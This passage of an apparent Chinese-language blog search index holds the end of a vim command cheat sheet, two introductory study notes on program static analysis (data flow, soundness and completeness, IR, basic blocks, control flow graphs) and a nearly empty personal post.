<p><code>0/^</code>：移至光标所在行的”行首”</p>
<p><code>w</code>：光标移至下个字的开头</p>
<p><code>e</code>：光标移至下个字的字尾</p>
<p><code>b</code>：光标移至上个字的开头</p>
<p><code>W</code>：向右跳转到下一个单词</p>
<p><code>B</code>：向左回跳到上一个单词</p>
<h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><p><code>x</code>：每按一次，删除光标所在处的字符</p>
<p><code>nx</code>：<code>6x</code>表示，删除光标后的6个字符</p>
<p><code>X</code>：每按一次，删除光标前面的一个字符</p>
<p><code>nX</code>：<code>6X</code>表示，删除光标前的6个字符</p>
<p><code>dd</code>：删除光标所在行</p>
<p><code>ndd</code>：从光标所在行开始删除n行</p>
<p><code>dG</code>：删除从光标所在行开始到文件末尾的内容</p>
<p><code>D</code>：删除光标处到行尾的内容</p>
<p><code>：n1,n2d</code>：删除<code>n1~n2</code>指定范围的行</p>
<p><code>cc</code>：删掉整行</p>
<h2 id="复制"><a href="#复制" class="headerlink" title="复制"></a>复制</h2><p><code>yy</code>：复制当前行</p>
<p><code>nyy</code>：<code>6yy</code>表示复制当行往下数以下6行</p>
<p><code>dd</code>：剪切当前行</p>
<p><code>ndd</code>：<code>6dd</code>表示剪切当行往下数以下6行</p>
<p><code>p</code>：粘贴在当前行下面</p>
<p><code>P</code>：粘贴在当前行上面</p>
<p><code>u</code>：撤销，恢复，undo</p>
<h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><p><code>/string</code>：搜索指定字符串</p>
<p><code>n</code>：搜索下一个出现的位置</p>
<p><code>/</code>：<code>/范围 /要替换的/替换的/g</code></p>
<h2 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h2><p><code>r</code>：进行替换当前字符模式，替换一个字符</p>
<p><code>R</code>：从光标所在处开始替换字符，可以写一堆</p>
<p><code>u</code>：撤销上一步操作</p>
<h2 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h2><p><code>:w</code>：保存</p>
<p><code>:w new_file_name</code>：保存到指定路径</p>
<p><code>:wq</code>：保存并退出</p>
<p><code>:q!</code>：不保存，强制退出</p>
<p><code>:wq!</code>：强行保存</p>
<h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><p><code>:r filename</code>：将文件内容导入到当前Vim文件中</p>
<p><code>:r ! cmd</code>：将命令执行结果导入到当前文件之中</p>
<h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><p><code>:map ^B 2251267401@qq.com</code>：定义ctrlB为快捷键，替换个人邮箱（尖括号是用ctrl+v+B敲出来）</p>
<h2 id="vim配置文件"><a href="#vim配置文件" class="headerlink" title="vim配置文件"></a>vim配置文件</h2><p><code>:syntax on</code> ： 语法高亮</p>
<p><code>:set number</code>：显示行号</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux基础</tag>
      </tags>
  </entry>
  <entry>
    <title>静态分析入门笔记02</title>
    <url>/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B002/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>遥望洞庭山水翠，白银盘里一青螺。</p>
</blockquote>
<p>这篇梳理数据流分析及相关方法。</p>
<a id="more"></a>

<h1 id="数据流-Data-Flows"><a href="#数据流-Data-Flows" class="headerlink" title="数据流 Data Flows"></a>数据流 Data Flows</h1><h2 id="CFG上到底是什么在流动？"><a href="#CFG上到底是什么在流动？" class="headerlink" title="CFG上到底是什么在流动？"></a>CFG上到底是什么在流动？</h2><p>是<strong>数据流</strong>。</p>
<p>绝大部分静态分析牺牲了<strong>completeness</strong>。</p>
<p>先讲两点：</p>
<ol>
<li>对变量进行抽象表达。</li>
<li>over-approcimation：过近似。就是说无论实际函数产生了多么复杂的情况，静态分析时都应该包含每种情况。</li>
</ol>
<p><strong>may-analysis</strong>：绝大部分静态分析，最常见。</p>
<blockquote>
<p>Outputs: maybe-true , so -&gt; over-approximation.</p>
</blockquote>
<p><strong>must-analysis</strong>: 为了报出来<strong>一定</strong>是正确的，那么就必须under-approximation。</p>
<blockquote>
<p>Outputs: must be true , so -&gt; under-approximation.</p>
</blockquote>
<p>同一目标：<strong><em>safe-approximation</em></strong></p>
]]></content>
      <categories>
        <category>静态分析</category>
      </categories>
      <tags>
        <tag>静态分析基础</tag>
      </tags>
  </entry>
  <entry>
    <title>静态分析入门笔记01</title>
    <url>/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B001/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>男儿何不带吴钩，收取关山五十州。</p>
</blockquote>
<p>从这篇文章开始，我会在我的博客中记录学习<strong>程序静态分析</strong>的点点滴滴，我也会把在疫情期间，自己在家中学习的成果和收获上传到我的博客，记录自己的点滴进步。</p>
<a id="more"></a>

<h1 id="PL？程序分析？"><a href="#PL？程序分析？" class="headerlink" title="PL？程序分析？"></a>PL？程序分析？</h1><h2 id="PL的三大模块"><a href="#PL的三大模块" class="headerlink" title="PL的三大模块"></a>PL的三大模块</h2><p><img src="../images/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B001/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%9001_1.jpg" alt="q"></p>
<h3 id="理论部分"><a href="#理论部分" class="headerlink" title="理论部分"></a>理论部分</h3><ol>
<li>程序是如何设计的</li>
<li>语言的类型系统</li>
<li>语言的形式语义与逻辑系统</li>
</ol>
<h3 id="支撑环境"><a href="#支撑环境" class="headerlink" title="支撑环境"></a>支撑环境</h3><ol>
<li>编译器：对语言语法的解析，字节码转换等</li>
<li>运行时系统：Java，Python等，JVM虚拟机，内存分配，管理</li>
</ol>
<h3 id="语言应用"><a href="#语言应用" class="headerlink" title="语言应用"></a>语言应用</h3><ol>
<li>程序分析</li>
<li>程序验证</li>
<li>程序合成：例如如何自动生成一个程序</li>
</ol>
<h2 id="语言核心"><a href="#语言核心" class="headerlink" title="语言核心"></a>语言核心</h2><p>核心无非分为三类：</p>
<ol>
<li><p><strong>命令式语言Imperative language</strong>：Java，C/C++等</p>
<p>把程序逻辑拆解成一条条指令，加载到内存，顺序执行下来。</p>
</li>
<li><p><strong>函数式语言Functional language</strong>：Pascal，JS，Python</p>
<p>命令式与函数式相结合，把逻辑包装起来，形式化。</p>
</li>
<li><p><strong>逻辑式语言Prolog</strong>：</p>
<p>声明，逻辑，与、或、非。</p>
</li>
</ol>
<blockquote>
<p>语言核心没有变，用语言写的程序变得复杂了。</p>
</blockquote>
<p>#静态分析</p>
<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><blockquote>
<p>在程序运行前，在编译时刻就完成程序安全性，可靠性的检验。不用运行程序本身，就能检查出程序潜在的问题。</p>
</blockquote>
<ol>
<li>程序运行时会不会有隐私泄露？</li>
<li>空指针引用异常？</li>
<li>cast安全吗？</li>
<li>v1，v2两个变量会不会造成内存竞争？要不要加锁？</li>
<li>assert运行时会不会fail掉？</li>
<li>dead code？</li>
</ol>
<h2 id="Rice’s-Theorem"><a href="#Rice’s-Theorem" class="headerlink" title="Rice’s Theorem"></a>Rice’s Theorem</h2><blockquote>
<p>程序分析不存在  <strong><em>exact answer</em></strong></p>
</blockquote>
<p>正常的递归可枚举语言，<strong>不存在</strong>某个方法，可以去判断其是否存在问题。</p>
<h2 id="Sound-amp-Complete"><a href="#Sound-amp-Complete" class="headerlink" title="Sound &amp; Complete"></a>Sound &amp; Complete</h2><blockquote>
<p>Sound &gt; Truth &gt; Complete</p>
</blockquote>
<ul>
<li><p>Sound：Overapproximate，肯定会包含Truth。</p>
<p>假如Truth就是代表有10个空指针异常，那么Sound可以有1k，1w个空指针异常，就是<strong><em>包含Truth的关系</em></strong>。</p>
</li>
<li><p>Complete：Underapproximate，一定在Truth里面。</p>
<p>上一个例子，无论Complete里面有几个空指针异常，只要存在的，就一定在Truth里面，<strong><em>是Truth子集的关系</em></strong>。</p>
</li>
</ul>
<h2 id="Useful-static-analysis"><a href="#Useful-static-analysis" class="headerlink" title="Useful static analysis"></a>Useful static analysis</h2><ul>
<li>妥协Soundness：会产生<strong>【漏报】</strong>，<strong><em>False Negatives</em></strong></li>
<li>妥协Completeness：会产生<strong>【误报】</strong>，<strong><em>False Positives</em></strong></li>
</ul>
<p>但是在绝大部分的静态分析中，绝大部分都<strong><em>【妥协Completeness】</em></strong>。</p>
<p>宁可误报，也不要漏报！</p>
<h2 id="准则"><a href="#准则" class="headerlink" title="准则"></a>准则</h2><p>在保证<strong>soundness</strong>的基础上，在<strong>【精度】</strong>和<strong>【速度】</strong>上作出权衡。</p>
<h1 id="抽象-近似"><a href="#抽象-近似" class="headerlink" title="抽象+近似"></a>抽象+近似</h1><ol>
<li>抽象：判断变量的+/—/0符号。</li>
<li>近似：在抽象的基础上进行近似。<ul>
<li>Transfer function</li>
<li>Control flows</li>
</ul>
</li>
</ol>
<p>Concrete Domain ——&gt; Abstract Domain</p>
<p>不关心是具体数值，关心变量的符号位。</p>
<p><strong>Transfer function</strong>：</p>
<p>在静态分析中，transfer fuction主要应用在于如何在程序语句的抽象值上进行运算。</p>
<p>根据你分析的程序的目标，和程序中每一个语句的语义，综合地设计分析方法。</p>
<p><img src="../images/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B001/image-20200325173724216.png" alt></p>
<p><strong>Control flows</strong>：</p>
<p>控制流，就是程序执行的流。控制流图，程序如何跳转。</p>
<p><img src="../images/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B001/image-20200325173739742.png" alt></p>
<h1 id="IR-Intermediate-representation"><a href="#IR-Intermediate-representation" class="headerlink" title="IR (Intermediate representation)"></a>IR (Intermediate representation)</h1><h2 id="Compiler-amp-Analysis"><a href="#Compiler-amp-Analysis" class="headerlink" title="Compiler &amp; Analysis"></a>Compiler &amp; Analysis</h2><ol>
<li><p>Compiler:</p>
<p>需要将人写的高级代码，<strong>【编译】</strong>成机器可以看懂的机器码。</p>
<p>在这个过程中，编译器做的工作不仅有【翻译】，还会有【检查】。</p>
<p><img src="../images/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B001/image-20200325190416693.png" alt="image-20200325190416693"></p>
</li>
<li><p>AST vs. IR:</p>
<p><img src="../images/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B001/image-20200325192746007.png" alt="image-20200325192746007"></p>
</li>
</ol>
<h1 id="3AC"><a href="#3AC" class="headerlink" title="3AC"></a>3AC</h1><p>3AC：三地址码。<code>a = b + c</code></p>
<h1 id="Control-Flow-Analysis"><a href="#Control-Flow-Analysis" class="headerlink" title="Control Flow Analysis"></a>Control Flow Analysis</h1><h2 id="Basic-Blocks"><a href="#Basic-Blocks" class="headerlink" title="Basic Blocks"></a>Basic Blocks</h2><p>最大的、连续的、3AC指令块。</p>
<p>有且只有一个入口，并且是第一行指令是入口。</p>
<p>出口也是唯一的，是最后一个指令。</p>
<h3 id="如何划分BB？"><a href="#如何划分BB？" class="headerlink" title="如何划分BB？"></a>如何划分BB？</h3><ol>
<li>首先决定BB入口在哪：<ol>
<li>程序中的第一行语句。</li>
<li>无条件跳转的目标语句也是入口。</li>
<li>紧接着条件/无条件跳转的语句也是个BB入口。</li>
</ol>
</li>
<li>有了BB入口，接下来：<ol>
<li>有了入口，那么整个BB包含入口开始的连续语句，直到下一个leader的位置。</li>
</ol>
</li>
</ol>
<h2 id="CFG"><a href="#CFG" class="headerlink" title="CFG"></a>CFG</h2><p>控制流图。</p>
<p>控制流图的node其实就是BB代码块。</p>
<p><img src="../images/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B001/image-20200327194043941.png" alt="image-20200327194043941"></p>
]]></content>
      <categories>
        <category>静态分析</category>
      </categories>
      <tags>
        <tag>静态分析基础</tag>
      </tags>
  </entry>
  <entry>
    <title>Life</title>
    <url>/Life/</url>
    <content><![CDATA[<p>#Make it better.</p>
<a id="more"></a>

]]></content>
      <tags>
        <tag>new begin</tag>
      </tags>
  </entry>
</search>
